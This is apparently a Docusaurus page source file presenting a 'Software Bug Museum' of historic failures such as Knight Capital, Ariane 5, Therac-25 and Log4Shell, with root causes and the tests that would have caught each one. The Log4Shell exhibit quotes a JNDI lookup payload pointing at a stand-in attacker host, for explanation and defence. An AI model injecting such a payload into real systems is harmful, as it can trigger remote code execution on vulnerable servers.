import React, { ReactNode } from 'react';
import Layout from '@theme/Layout';
import BugMuseum from '@site/src/components/BugMuseum';
import styles from './index.module.css';

const museumExhibits = [
  {
    id: "knight-capital-2012",
    title: "Knight Capital: The $440 Million 45-Minute Deployment Bug",
    category: "Deployment & Dead Code",
    whatHappened: "On August 1, 2012, Knight Capital deployed new automated market-making software to 8 servers. An engineer forgot to copy the updated code to server #8. When the market opened, server #8 repurposed an old test flag to trigger obsolete 'Power Peg' test code, rapidly buying high and selling low across 148 stocks, losing $440 million in 45 minutes.",
    whyMissed: "Deployment was executed manually with no automated cluster consistency verification. Dead code remained in the codebase for 9 years behind recycled boolean flags.",
    rootCause: "Failure to decommission dead code, recycling old configuration flags for new features, and lack of automated deployment quality gates.",
    howToDetect: "Feature flag audit scans, automated cluster deployment hashes validation, and circuit-breaker anomaly kill-switches.",
    testToCatch: "Automated pre-flight smoke test verifying build SHA checksums match identically across 100% of production cluster nodes before routing traffic."
  },
  {
    id: "crowdstrike-2024",
    title: "CrowdStrike 2024: Channel File 291 Kernel Crash",
    category: "Input Boundary & Array Index",
    whatHappened: "In July 2024, a rapid configuration update (Channel File 291) deployed to 8.5 million Windows machines. The kernel driver attempted to read memory beyond the allocated array buffer due to a 21st input field matching an unexpected pattern, causing widespread Windows Blue Screen of Death (BSOD) loops.",
    whyMissed: "Configuration data files were treated as 'content' rather than executable code, bypassing staging canary rollouts and automated kernel-mode fuzz testing.",
    rootCause: "Out-of-bounds pointer read in kernel driver; missing schema boundary validation on dynamic configuration payloads.",
    howToDetect: "Automated fuzz testing of driver input parsers, bounded memory-safe accessors, and staged canary deployments (0.1% -> 1% -> 100%).",
    testToCatch: "Kernel input fuzzing suite generating malformed/out-of-bounds channel file inputs inside an isolated VM sandbox before release."
  },
  {
    id: "ariane-5-1996",
    title: "Ariane 5: The $370M Integer Overflow Explosion",
    category: "Type Conversion & Numeric Limits",
    whatHappened: "In 1996, the maiden flight of the Ariane 5 rocket exploded 37 seconds after launch. A 64-bit floating-point horizontal velocity value was converted to a 16-bit signed integer in the inertial reference software. The higher velocity exceeded 32,767, triggering an unhandled hardware trap that swerved the rocket engines off course.",
    whyMissed: "The software module was copied directly from the older Ariane 4 rocket without re-evaluating trajectory velocity assumptions for the more powerful Ariane 5.",
    rootCause: "Unhandled arithmetic overflow on numeric type narrowing conversion with disabled exception handling.",
    howToDetect: "Static analysis for unsafe numeric casts, boundary value analysis on flight envelope limits, and automated hardware-in-the-loop simulation.",
    testToCatch: "Boundary test injecting maximum theoretical Ariane 5 acceleration profiles into the navigation engine to assert no unhandled numeric overflow traps."
  },
  {
    id: "mars-climate-orbiter-1999",
    title: "Mars Climate Orbiter: The Metric vs Imperial Unit Defect",
    category: "Contract & Interface Mismatch",
    whatHappened: "In 1999, NASA's $327 million Mars Climate Orbiter burned up in the Martian atmosphere. Ground software generated thruster impulse data in English units (Pound-force seconds), while onboard spacecraft navigation expected international metric units (Newton-seconds), causing a 170 km trajectory error.",
    whyMissed: "End-to-end interface contract testing between ground control and spacecraft software was not executed under real telemetry simulation.",
    rootCause: "Lack of explicit type definitions and units in cross-system interface specification schemas (Contract Mismatch).",
    howToDetect: "Consumer-driven contract testing (e.g. Pact / typed schemas), dimensional analysis linters, and end-to-end integration tests.",
    testToCatch: "Automated API contract test asserting that thruster impulse payloads contain explicitly typed dimensional units with metric conversion validations."
  },
  {
    id: "healthcare-gov-2013",
    title: "Healthcare.gov 2013: Launch Day Concurrency Database Lockup",
    category: "Concurrency & Load Scalability",
    whatHappened: "On October 1, 2013, Healthcare.gov launched with massive public interest. Only 6 people managed to sign up on day one. The system required mandatory account creation and synchronous credit verification before browsing plans, bottlenecking on single-threaded database table locks.",
    whyMissed: "Load testing was only performed on individual isolated components, never as an end-to-end synchronous user journey under concurrent peak loads.",
    rootCause: "Synchronous blocking dependencies, lack of caching, and unindexed database queries under concurrent transaction volume.",
    howToDetect: "End-to-end distributed load testing (e.g. JMeter/k6) modeling peak concurrent user funnels and measuring database lock contention.",
    testToCatch: "JMeter peak load test simulating 50,000 concurrent user registrations measuring p99 API latencies and verifying zero deadlock exceptions."
  },
  {
    id: "therac-25-1985",
    title: "Therac-25: The Race Condition That Killed",
    category: "Race Condition & Concurrency",
    whatHappened: "Between 1985 and 1987, the Therac-25 radiation therapy machine delivered massive overdoses of radiation to at least six patients, several fatally. A race condition let a skilled operator switch the machine from its low-power X-ray setup to high-power electron-beam mode by editing treatment parameters and pressing 'Enter' fast enough — a window of roughly 8 seconds — while the beam-flattening attenuator was still out of position, exposing patients to a beam up to 100 times the intended dose.",
    whyMissed: "The race condition only manifested for fast, experienced data-entry operators — testers and QA staff typed more slowly and never landed inside the timing window. Earlier models had a hardware interlock as a backup; Therac-25 removed it and relied on software alone.",
    rootCause: "A shared, unsynchronized flag variable was read by one concurrent task (the treatment monitor) while another (the keyboard handler) could still be modifying machine state — a classic time-of-check-to-time-of-use race condition, with no hardware safety net behind it.",
    howToDetect: "Concurrency/race-condition testing that varies input timing (not just input values), mandatory hardware interlocks as defense-in-depth, and code review specifically for shared mutable state accessed without locking.",
    testToCatch: "An automated UI-fuzzing test that rapidly edits and re-edits treatment-mode parameters within the known race window, asserting the beam physically cannot fire unless the hardware confirms correct attenuator position — not just that the software believes it does."
  },
  {
    id: "citigroup-revlon-2020",
    title: "Citigroup's $900 Million Fat-Finger Payment",
    category: "UI Workflow & Confirmation Design",
    whatHappened: "In August 2020, Citibank — acting as administrative agent on a Revlon syndicated loan — intended to pay lenders only the interest due (about $7.8 million). Instead, its loan-processing system sent the full outstanding principal: roughly $900 million. Some lenders returned the funds; others refused, triggering a major lawsuit that took years to resolve.",
    whyMissed: "The internal system required staff to manually mark specific fields so a payment stayed 'washed' internally rather than actually leaving the bank — a routine interest payment required deliberately working around an interface built for a different transaction shape. Three separate reviewers were required to sign off, and all three missed the same misconfigured field.",
    rootCause: "A confusing, error-prone manual workflow for a routine operation, with no clear, unambiguous confirmation screen summarizing 'this exact amount will be sent to this exact recipient' before an irreversible, high-value transfer.",
    howToDetect: "UI/UX testing of confirmation flows on irreversible high-value actions, specifically checking whether the system surfaces a clear plain-language summary before submission — not just whether the underlying checkboxes were technically set correctly.",
    testToCatch: "An E2E test that runs a routine interest-only payment through the exact production workflow (including any internal-offset/wash steps) and asserts zero principal is disbursed externally unless a dedicated, unambiguous principal-payment confirmation was explicitly completed."
  },
  {
    id: "log4shell-2021",
    title: "Log4Shell: When a Logging Library Became an RCE",
    category: "Injection & Untrusted Input",
    whatHappened: "In December 2021, a critical vulnerability (CVE-2021-44228) was disclosed in Apache Log4j, one of the most widely used Java logging libraries. Log4j would evaluate special lookup strings like `${jndi:ldap://attacker.com/a}` found anywhere in logged input — an HTTP header, a username, a chat message — and could be tricked into loading and executing attacker-controlled code. Because Log4j sat transitively inside an enormous number of Java applications, this became one of the most widespread, severe vulnerabilities in software history, forcing emergency patching industry-wide within days.",
    whyMissed: "Logging was treated as a low-risk utility that 'just writes text,' so it never received the same input-sanitization scrutiny applied to obviously user-facing fields. A powerful, rarely-used feature — JNDI lookups inside log messages — had shipped enabled by default for years before anyone recognized the security implication.",
    rootCause: "Untrusted, attacker-controlled input was passed into a context that interpreted and executed part of it, rather than treating it as inert text — the same category of failure as SQL injection, just in a place (a logging call) nobody thought to threat-model.",
    howToDetect: "Software composition analysis (SCA) scanning for known-vulnerable dependency versions, fuzzing every sink that logs user-controlled input with injection-style payloads, and secure-by-default review of any feature that interprets strings as executable lookups.",
    testToCatch: "An automated security regression test that submits a JNDI-lookup-style payload through every user-controlled input reaching a log statement, asserting the string is logged literally and no outbound network lookup ever occurs."
  }
];

export default function BugMuseumPage(): ReactNode {
  return (
    <Layout
      title="Bug Museum — Real-World Software Disasters & Post-Mortems"
      description="Explore famous real-world software glitches, outages, and financial bugs with root cause analyses and the exact QA automation tests to prevent them.">
      <main className={styles.container}>
        <div className="container">
          <div className={styles.header}>
            <span className={styles.badge}>CASE STUDIES</span>
            <h1 className={styles.title}>The Software Bug Museum</h1>
            <p className={styles.subtitle}>
              Real defects that changed history. Explore deep post-mortems, root cause analyses, and the automated tests that would have caught them.
            </p>
          </div>

          <div className={styles.exhibitsGrid}>
            {museumExhibits.map((exhibit) => (
              <div key={exhibit.id} className={styles.exhibitCard}>
                <BugMuseum {...exhibit} />
              </div>
            ))}
          </div>
        </div>
      </main>
    </Layout>
  );
}
